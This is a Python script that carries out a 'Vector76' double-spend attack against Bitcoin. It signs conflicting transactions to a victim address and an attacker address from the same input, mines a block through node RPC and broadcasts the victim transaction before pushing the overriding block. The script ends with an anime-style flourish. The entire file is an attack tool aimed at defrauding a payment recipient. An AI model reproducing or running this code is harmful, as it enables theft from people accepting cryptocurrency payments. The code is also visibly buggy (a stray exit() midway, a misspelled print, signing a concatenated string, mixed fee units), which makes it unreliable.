import argparse
import requests
import subprocess
import bitcoin.rpc
import bitcoin.core

import cryptos

parser = argparse.ArgumentParser(description="How To Use vector76")
parser.add_argument("node_host",
                    help="Blockchain Node Host",
                    type=str)
parser.add_argument("node_port",
                    help="Blockchain Node Port",
                    type=int)
parser.add_argument("username",
                    help="Public node username",
                    type=str)
parser.add_argument("password",
                    help="Public node password",
                    type=str)

parser.add_argument("attacker_signkey",
                    help="The attacker has the WIF format private key of the first address (this is used to sign the transaction)",
                    type=str)
parser.add_argument("victim_address",
                    help="Victim address.",
                    type=str)
parser.add_argument("attacker_address",
                    help="Address held by attacker to receive refund (Please prepare an address that is different from the address that can be generated with the private key specified in the first place.)",
                    type=str)
parser.add_argument("amount_of_coins",
                    help="Amount of coins sent. (Enter in BTC units)",
                    type=float)
parser.add_argument("--is_testnet",
                    help="testnet flag (Default=True)",
                    default=True,
                    type=bool)
parser.add_argument("--fee",
                    help="BTC send fee. (Default=0.00015)",
                    default=0.00015,
                    type=float)
parser.add_argument("--last_txid",
                    "-txid",
                    help="Last txid (address of attacker_signkey)",
                    type=str)

def to_satoshi(btc_amount):
    satoshi = 0.00000001
    return round(btc_amount / satoshi)

def broadcast_transaction(raw_tx, testnet):
    url = "https://blockstream.info/api/tx"
    headers = {'Content-Type': 'text/plain'}
    payload = raw_tx
    if testnet:
        url = "https://blockstream.info/testnet/api/tx"
        headers = {'Content-Type': 'text/plain'}
        payload = raw_tx

    response = requests.post(url, data=payload, headers=headers)
    print(response.text)
    if response.status_code == 200:
        print("Transaction successfully broadcasted!")
    else:
        print(f"Failed to broadcast transaction. Status code: {response.status_code}")


args = parser.parse_args()
rpc_host = args.node_host
rpc_port = args.node_port
username = args.username
password = args.password

key = args.attacker_signkey
victim_address   = args.victim_address
attacker_address = args.attacker_address
amount_btc = args.amount_of_coins
testnet    = args.is_testnet
fee        = args.fee
fee        = args.fee
last_txid  = args.last_txid

transaction_util = cryptos.Bitcoin(testnet=testnet)
print("Connecting Public Node...")
rpc_node = bitcoin.rpc.Proxy(service_url=f"http://{username}:{password}@{rpc_host}",
                 service_port=rpc_port)
print("OK")
send_amount = to_satoshi(amount_btc)
inputs = transaction_util.unspent(transaction_util.wiftoaddr(key))
print(inputs)
print()

if send_amount < fee:
    print("[!] The fees exceed the amount sent. Please review the amount of fees and amount of BTC.")
    exit()

change_address = transaction_util.wiftoaddr(key)
balance = transaction_util.get_balance(change_address)[0]["value"]
print(f"Balance : {balance}")

change_btc_amt = (balance - (send_amount - fee)) #おつり
tx_victim = [{"address": victim_address, "value": send_amount}, {"address": change_address, "value": change_btc_amt}]
tx_victim = transaction_util.mktx(inputs, tx_victim)
tx_victim["ins"][0]["prev_hash"] = last_txid
print(tx_victim)
tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, key))
tx_attacker = [{"address": attacker_address, "value": send_amount}, {"address": change_address, "value": change_btc_amt}]
tx_attacker = transaction_util.mktx(inputs, tx_attacker)
tx_attacker["ins"][0]["prev_hash"] = last_txid
tx_attacker = cryptos.serialize(transaction_util.sign(tx_attacker, 0, key))
print()
print(tx_attacker)
print()
tx_vector76 = f"{tx_attacker}{tx_victim}"
tx_vector76 = cryptos.serialize(transaction_util.sign(tx_vector76, 0, key))
print(tx_vector76)
exit()
print("Mining Vector76 block...")
payload = [attacker_address, [tx_vector76], False]
print(f"Payload : {payload}")
vector76_response = rpc_node.call("generateblock", attacker_address, [tx_vector76], False)
print()
print(f"Mining Response : {vector76_response}")
print()
print("--------------------")
print(f"Victim      : {victim_address}")
print(f"Attacker    : {attacker_address}")
print(f"Send Amount (Satoshi unit)    : {send_amount} Satoshi")
print(f"Fee Amount  (Satoshi unit)    : {fee} Satoshi")
print(f"Signed V1 RawTx           : {tx_victim}")
print(f"Signed V2 RawTx           : {tx_attacker}")
print(f"Vector76  Block           : {tx_vector76}")
print(f"Mined Vector76 Block      : {vector76_response}")
pirnt(f"Testnet Mode              : {testnet}")
print("--------------------")
print()
print()
print("[+] READY...")
print()
input(" --- Press the enter key to continue the Vector76 attack... --- ")
print()
print("OK")
print("push V1 TX...")
broadcast_transaction(tx_victim, testnet)

input("--- Send the block after pressing the enter key. --- ")
print("既に送ったトランザクションに対して強制干渉を開始...")
print("C  V E C T O R B L  (Vector76ブロックへ変更)")
result = rpc_node.submitblock(tx_vector76)
print(result)
print()
#ゴリ押し
broadcast_transaction(tx_vector76, testnet)
broadcast_transaction(vector76_response, testnet)
result = rpc_node.submitblock(vector76_response)  #ゴリ押し
print()
#おまけ
print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
print()

sound_name = "ImagineBreaker.mp3"
try:
    import soundplay
    soundplay.playsound(sound_name)
except:
    # Termux Only
    imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
    subprocess.run(imagine_breaker_cmd)

print("Done.")
